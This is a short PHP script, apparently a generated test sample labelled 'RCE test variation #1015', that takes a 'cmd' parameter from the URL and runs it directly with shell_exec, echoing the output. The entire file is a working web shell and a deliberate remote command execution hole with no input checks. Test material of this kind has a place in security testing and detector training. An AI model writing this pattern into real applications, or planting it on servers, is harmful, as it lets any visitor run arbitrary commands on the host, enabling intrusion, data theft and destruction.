<?php
// RCE test variation #1015
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>